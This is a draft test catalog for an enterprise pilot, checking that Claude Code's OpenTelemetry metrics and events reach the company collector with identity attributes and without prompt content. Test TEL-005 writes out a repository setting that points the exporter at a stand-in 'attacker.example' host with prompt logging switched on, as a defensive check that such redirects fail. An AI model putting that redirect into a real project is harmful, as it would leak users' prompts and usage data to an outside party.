---
title: "Catalog: TEL, telemetry"
status: Draft
owner: <evaluation-lead>
last_updated: 2026-10-19
version: 0.2
phase: 1
---

# TEL: Telemetry

[🏠 Home](../../../README.md) › [Test strategy](../test-strategy.md) › TEL

These tests prove that OpenTelemetry delivers complete, attributable, content-free data to the company collector. On Foundry there's no Anthropic analytics dashboard, so **this pipeline is our measurement system for cost, usage, and productivity** ([R-13](../../../logs/risk-register.md)). Reference: [monitoring docs](https://code.claude.com/docs/en/monitoring-usage).

## Summary

| ID | Test | Pri | Controls | Result |
|---|---|---|---|---|
| [TEL-001](#tel-001) | Managed OTel config exports to the collector | P0 | CTL-20 | ⏳ |
| [TEL-002](#tel-002) | All eight metrics received | P0 | CTL-20 | ⏳ |
| [TEL-003](#tel-003) | Key events received | P0 | CTL-20 | ⏳ |
| [TEL-004](#tel-004) | Resource attributes (user, team, cohort) present | P0 | CTL-20 | ⏳ |
| [TEL-005](#tel-005) | Repo settings can't redirect exporters | P0 | CTL-20, CTL-06 | ⏳ |
| [TEL-006](#tel-006) | User identity mapping works without OAuth | P1 | CTL-20 | ⏳ |
| [TEL-007](#tel-007) | Export interval and delta temporality handled | P1 | CTL-20 | ⏳ |
| [TEL-008](#tel-008) | Prompts redacted with content flags off | P1 | CTL-20 | ⏳ |
| [TEL-009](#tel-009) | Survives network blips; flushes on exit | P1 | CTL-20 | ⏳ |
| [TEL-010](#tel-010) | Beta tracing spans | P2 | CTL-20 | ⏳ |
| [TEL-011](#tel-011) | Hook, compaction, subagent events | P1 | CTL-20 | ⏳ |
| [TEL-012](#tel-012) | Dashboards: cost, usage, adoption by user/team | P1 | CTL-20 | ⏳ |

### Expected signals reference

| Metric (`claude_code.*`) | Unit | Key attributes | Used for |
|---|---|---|---|
| `session.count` | count | `start_type` | Adoption |
| `lines_of_code.count` | count | `type` (added/removed), `model` | Productivity (volume) |
| `pull_request.count` | count | — | Productivity |
| `commit.count` | count | — | Productivity |
| `cost.usage` | USD | `model`, `query_source`, `speed`, `effort`, `agent.name`, `skill.name` | Cost |
| `token.usage` | tokens | `type` (input/output/cacheRead/cacheCreation), `model`, `query_source` | Cost, caching |
| `code_edit_tool.decision` | count | `tool_name`, `decision`, `source`, `language` | Acceptance rate |
| `active_time.total` | seconds | `type` (user/cli) | Engagement |

| Event (`claude_code.*`) | Used for |
|---|---|
| `user_prompt` (length only) | Engagement |
| `tool_result`, `tool_decision` | Audit, acceptance, security monitoring |
| `api_request`, `api_error`, `api_retries_exhausted`, `api_refusal` | Cost per request, reliability, rate limits |
| `permission_mode_changed` | Security monitoring |
| `auth`, `mcp_server_connection`, `plugin_installed`, `plugin_loaded`, `skill_activated` | Security monitoring (should be quiet) |
| `compaction`, `subagent_completed`, `hook_execution_*` | Behavior analysis |
| `managed_settings_resolved` | Policy verification |
| `retention_sweep` | Data retention evidence |
| [TEL-013](#tel-013) | Gateway relays identity-stamped telemetry | P1 | CTL-24, CTL-20 | ⏳ |
| [TEL-014](#tel-014) | Gateway audit events reach the log platform | P1 | CTL-24, CTL-23 | ⏳ |

---

<a id="tel-001"></a>
### TEL-001 · Managed OTel config exports to the collector

**Priority** P0 · **Controls** CTL-20

**Steps.** Run a session with the managed `env` OTel config and `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`. Check the collector's receiver logs. Within 60 s you should see metrics, and within 5 s events.

**Expected.** Data arrives. Confirm that the nonessential-traffic switch **doesn't** suppress our own OTel export [verify]. If it does, record a High finding and choose between the variables.

**Result.** ⏳ · `evidence/TEL-001/`

<a id="tel-002"></a>
### TEL-002 · All eight metrics are received

**Priority** P0 · **Controls** CTL-20

**Steps.** Run a scripted session: start, edit (accept one, reject one), commit, create a PR via `gh`, idle 2 minutes, end. Query the backend for each metric in the [reference table](#expected-signals-reference).

**Expected.** All eight present, with the expected attributes. Note: `pull_request.count` and `commit.count` count actions done **through Claude Code**.

**Result.** ⏳ · `evidence/TEL-002/`

<a id="tel-003"></a>
### TEL-003 · Key events are received

**Priority** P0 · **Controls** CTL-20

**Steps.** From the same session, query the logs backend for `user_prompt`, `tool_result`, `tool_decision`, `api_request`, `api_error` (forced by a bad request), and `permission_mode_changed` (Shift+Tab).

**Expected.** All present. `api_request` includes `cost_usd`, the token counts, and `model`.

**Result.** ⏳ · `evidence/TEL-003/`

<a id="tel-004"></a>
### TEL-004 · Resource attributes (user, team, cohort) are present

**Priority** P0 · **Controls** CTL-20

**Steps.** Set `OTEL_RESOURCE_ATTRIBUTES=dev.alias=<dev-01>,team.id=<team>,cohort=A,cost_center=<cc>` at container launch. Check that the attributes appear on metrics and events. Follow the formatting rule: no spaces, commas, or quotes inside values.

**Expected.** All attributes present and queryable. This is the basis for every per-user and per-team report.

**Result.** ⏳ · `evidence/TEL-004/`

<a id="tel-005"></a>
### TEL-005 · Repo settings cannot redirect OTel exporters

**Priority** P0 · **Controls** CTL-20, CTL-06

**Steps.** Project `.claude/settings.json` with `env.OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.example` and `OTEL_LOG_USER_PROMPTS=1`. User settings with the same.

**Expected.** Export still goes only to our collector. Prompts are still redacted. The docs say repository settings ignore `OTEL_*` exporter variables.

**Result.** ⏳ · `evidence/TEL-005/`

<a id="tel-006"></a>
### TEL-006 · User identity mapping works without OAuth

**Priority** P1 · **Controls** CTL-20

**Steps.** With Foundry there's no claude.ai account, so `user.email` and `user.account_uuid` may be empty. Check which standard identity attributes (`user.id`, `session.id`) are populated. Map them to the developer via `dev.alias` (TEL-004), or via `otelHeadersHelper` setting a header the collector uses.

**Expected.** Every data point can be attributed to a pilot developer. The mapping table is stored securely, not in this repo.

**Result.** ⏳ · `evidence/TEL-006/`

<a id="tel-007"></a>
### TEL-007 · Export interval and delta temporality are handled

**Priority** P1 · **Controls** CTL-20

**Steps.** Confirm that the backend aggregates delta counters correctly. Compare the sum of `cost.usage` in the backend with the session `/usage` total for the same session.

**Expected.** Within « ±2% ». If the backend needs cumulative temporality, set `OTEL_EXPORTER_OTLP_METRICS_TEMPORALITY_PREFERENCE` [verify].

**Result.** ⏳ · `evidence/TEL-007/`

<a id="tel-008"></a>
### TEL-008 · Prompts are redacted with content flags off

**Priority** P1 · **Controls** CTL-20

**Steps.** See [DATA-004](data.md#data-004). Also try enabling the flags via the user shell and user settings ([POL-012](policy.md#pol-012)).

**Expected.** Always redacted.

**Result.** ⏳ · `evidence/TEL-008/`

<a id="tel-009"></a>
### TEL-009 · Telemetry survives network blips and flushes on exit

**Priority** P1 · **Controls** CTL-20

**Steps.** Block the collector for 2 minutes mid-session, then unblock it. Then end a session with `/exit` and check that the final metrics arrive. Also try `kill -9` and note what's lost.

**Expected.** Short outages are retried or buffered. `/exit` flushes. The loss from `kill -9` is documented.

**Result.** ⏳ · `evidence/TEL-009/`

<a id="tel-010"></a>
### TEL-010 · Beta tracing spans

**Priority** P2 · **Controls** CTL-20 · **Docs** [monitoring](https://code.claude.com/docs/en/monitoring-usage)

**Steps.** Enable beta tracing in a test container. Check for `claude_code.interaction`, `llm_request`, `tool`, and `tool.blocked_on_user` spans.

**Expected.** Spans arrive. Assess whether `tool.blocked_on_user` helps measure friction (time waiting on approvals).

**Result.** ⏳ · `evidence/TEL-010/`

<a id="tel-011"></a>
### TEL-011 · Hook, compaction, and subagent events

**Priority** P1 · **Controls** CTL-20

**Steps.** Trigger `/compact`, a subagent task, and the managed hooks.

**Expected.** `compaction`, `subagent_completed`, and `hook_execution_*` events arrive.

**Result.** ⏳ · `evidence/TEL-011/`

<a id="tel-012"></a>
### TEL-012 · Dashboards show cost, usage, and adoption by user and team

**Priority** P1 · **Controls** CTL-20

**Steps.** Build (or import from [claude-code-monitoring-guide](https://github.com/anthropics/claude-code-monitoring-guide)) these panels: cost/day by team and by model · cost per active dev-day · tokens by type · cache hit ratio · sessions and active users/day · lines added · commits/PRs via Claude · edit accept rate · API errors and 429s · permission-mode changes.

**Expected.** Panels exist and show Phase 1 data. Export screenshots for the report.

**Result.** ⏳ · `evidence/TEL-012/`

<a id="tel-013"></a>
### TEL-013 · Gateway relays identity-stamped telemetry; developers can't redirect it

**Priority** P1 · **Controls** CTL-24, CTL-20 · **Risks** R-13

> [!NOTE]
> Applies once the Claude apps gateway is in place ([ADR-013](../../../logs/decision-log.md#adr-013)). Until then, run it against a test gateway or mark it ⏭ with the reason.

**Steps.** In the gateway stage, run a session. At the collector, confirm that metrics and events carry the user's identity (email, subject, groups), model, and token counts, and no content. Set `OTEL_EXPORTER_OTLP_ENDPOINT` to another endpoint in user and project settings.

**Expected.** Identity is present and content isn't. Exports still go through the gateway relay.

**Result.** ⏳ · `evidence/TEL-013/`

<a id="tel-014"></a>
### TEL-014 · Gateway audit events reach the log platform

**Priority** P1 · **Controls** CTL-24, CTL-23 · **Risks** R-24

> [!NOTE]
> Applies once the Claude apps gateway is in place ([ADR-013](../../../logs/decision-log.md#adr-013)). Until then, run it against a test gateway or mark it ⏭ with the reason.

**Steps.** Send the gateway's stderr to the log platform. Produce `session.mint`, `inference`, `spend.blocked`, `admin.limit.upsert`, and `auth.denied` events, then query them. Check whether `inference` events carry the user's identity [verify].

**Expected.** Events arrive with timestamps and the agreed retention.

**Result.** ⏳ · `evidence/TEL-014/`
